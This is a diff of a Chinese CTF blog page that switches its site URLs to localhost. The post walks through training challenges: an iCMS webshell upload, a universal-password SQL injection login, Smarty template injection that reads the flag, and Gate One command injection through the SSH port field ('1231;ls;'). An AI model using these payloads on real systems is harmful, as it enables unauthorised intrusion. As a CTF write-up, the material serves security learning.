@@ -11,22 +11,22 @@
   <meta name="author" content="kveln">
   <title>安恒培训摸底题 |  </title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
-  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
-  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <!-- <link href="http://localhost:4000/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="http://localhost:4000/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="安恒培训摸底题 |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="安恒培训摸底题 |   » Feed" href="http://localhost:4000/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
-  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <link href="http://localhost:4000/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
   <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/jquery.min.js"></script> -->
   <script>hljs.initHighlightingOnLoad();</script>
   
 
     <meta property="og:description" content="安恒培训摸底题"/>
-    <meta property="og:url" content="https://guokeya.github.io/post/aEfAJxsVS/"/>
+    <meta property="og:url" content="http://localhost:4000/post/aEfAJxsVS/"/>
     <meta property="og:locale" content="zh-CN"/>
     <meta property="og:type" content="website"/>
     <meta property="og:site_name" content=" "/>
@@ -35,7 +35,7 @@
   	<!-- Navigation -->
   <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
     <div class="container">
-      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <a class="navbar-brand" href="http://localhost:4000"> </a>
       <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
         Menu
         <i class="fas fa-bars"></i>
@@ -72,7 +72,7 @@
     </div>
   </nav>
   <!-- Page Header -->
-  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+  <header class="masthead" style="background-image: url('http://localhost:4000/media/images/home-bg.jpg')">
     <div class="overlay"></div>
     <div class="container">
       <div class="row">
@@ -80,7 +80,7 @@
           <div class="post-heading">
           	<span class="tags">
           	 
-            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            <a href="http://localhost:4000/tag/CTF/" class="tag">CTF</a>
             
         </span>
             <h1>安恒培训摸底题</h1>
@@ -109,7 +109,7 @@ Thinkphp RCE一把梭</p>
 admin/admin123<br>
 跟着文章复现<code>https://xz.aliyun.com/t/4030</code><br>
 其中PHP输入流。可以用BP导入<br>
-<img src="https://guokeya.github.io/post-images/1594108156893.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1594108156893.png" alt="" loading="lazy"><br>
 坑点：</p>
 <pre><code>das.wetolink.com:48885/admincp.php?app=files&amp;do=IO&amp;frame=iPHP&amp;ext=zip&amp;udir=&amp;name=iCMS.APP.1-v1.1.1&amp;watermark=false
 udir。指的是附件目录的相对路径。
@@ -122,32 +122,32 @@ udir。指的是附件目录的相对路径。
 <p>然后就是安装引用。访问/app/shell.php</p>
 <h1 id="万能密码ssti">万能密码+SSTI</h1>
 <p>界面是这样的。<br>
-<img src="https://guokeya.github.io/post-images/1594108443579.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1594108443579.png" alt="" loading="lazy"><br>
 有Hint。login as admin<br>
 直接万能密码登陆</p>
 <pre><code>admin\
 ||1#
 </code></pre>
 <p>然后就是更新账号处。SSTI<br>
-<img src="https://guokeya.github.io/post-images/1594108527617.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1594108527617.png" alt="" loading="lazy"><br>
 输入的值。都会返回<br>
 PHP的模板注入。貌似就TWIG和Smart<br>
 这里是smart的SSTI<br>
-<img src="https://guokeya.github.io/post-images/1594108622441.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1594108622441.png" alt="" loading="lazy"><br>
 很多函数过滤了。直接用无参数那个。show_souce读flag<br>
-<img src="https://guokeya.github.io/post-images/1594108715215.png" alt="" loading="lazy"><br>
-<img src="https://guokeya.github.io/post-images/1594108742511.png" alt="" loading="lazy"></p>
+<img src="http://localhost:4000/post-images/1594108715215.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1594108742511.png" alt="" loading="lazy"></p>
 <h1 id="gate-one-ssh">Gate One SSH</h1>
 <p>OPPO OGeek CTF 2019原题。<br>
 跟着赵总的WP复现下<br>
 首先就github下源码。在<code>gateone/applications/terminal/plugins/ssh/ssh.py</code>中<br>
-<img src="https://guokeya.github.io/post-images/1594108947310.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1594108947310.png" alt="" loading="lazy"><br>
 这个get_host_fingerprint。传入一个settings。取其中的port值。带入字符串拼接然后执行<br>
-<img src="https://guokeya.github.io/post-images/1594108999788.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1594108999788.png" alt="" loading="lazy"><br>
 当访问WebSocket.terminal:ssh_get_host_fingerprint时。就会调用这个函数<br>
 全局搜到ssh.js<br>
-<img src="https://guokeya.github.io/post-images/1594109050567.png" alt="" loading="lazy"><br>
-<img src="https://guokeya.github.io/post-images/1594109413286.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1594109050567.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1594109413286.png" alt="" loading="lazy"><br>
 这里执行了</p>
 <pre><code>go.ws.send(JSON.stringify({'terminal:ssh_get_host_fingerprint': message}));
 #JSON.stringify-------将json转换为字符串。
@@ -159,16 +159,16 @@ PHP的模板注入。貌似就TWIG和Smart<br>
 go.ws.send('{&quot;terminal:ssh_get_host_fingerprint&quot;: {&quot;host&quot;:&quot;xxx&quot;,&quot;port&quot;:&quot;1231;ls;&quot;}}')
 </code></pre>
 <p>继续看这个go是啥<br>
-<img src="https://guokeya.github.io/post-images/1594109430517.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1594109430517.png" alt="" loading="lazy"><br>
 最终exp:</p>
 <pre><code>GateOne.ws.send('{&quot;terminal:ssh_get_host_fingerprint&quot;: {&quot;host&quot;:&quot;xxx&quot;,&quot;port&quot;:&quot;1231;ls;&quot;}}')
 </code></pre>
 <p>查看flag即可<br>
-<img src="https://guokeya.github.io/post-images/1594109508403.png" alt="" loading="lazy"></p>
+<img src="http://localhost:4000/post-images/1594109508403.png" alt="" loading="lazy"></p>
 
           
           <p class="next-post">下一篇：
-            <a href="https://guokeya.github.io/post/oBuGgKG72/">
+            <a href="http://localhost:4000/post/oBuGgKG72/">
               <span class="post-title">
                 SCTF UnsafeDefenseSystem(信息搜集+thinkphp反序列化+条件竞争)&rarr;
               </span>
@@ -212,7 +212,7 @@ go.ws.send('{&quot;terminal:ssh_get_host_fingerprint&quot;: {&quot;host&quot;:&q
             
               
               <li class="list-inline-item">
-              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+              <a href="http://localhost:4000/atom.xml" target="_blank">
                 <span class="fa-stack fa-lg">
                   <i class="fas fa-circle fa-stack-2x"></i>
                   <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
@@ -227,10 +227,10 @@ go.ws.send('{&quot;terminal:ssh_get_host_fingerprint&quot;: {&quot;host&quot;:&q
    </footer>
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/bootstrap.bundle.min.js"></script> -->
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/clean-blog.min.js"></script> -->
   <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
   <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
 <a id="back_to_top" href="#" class="back_to_top">
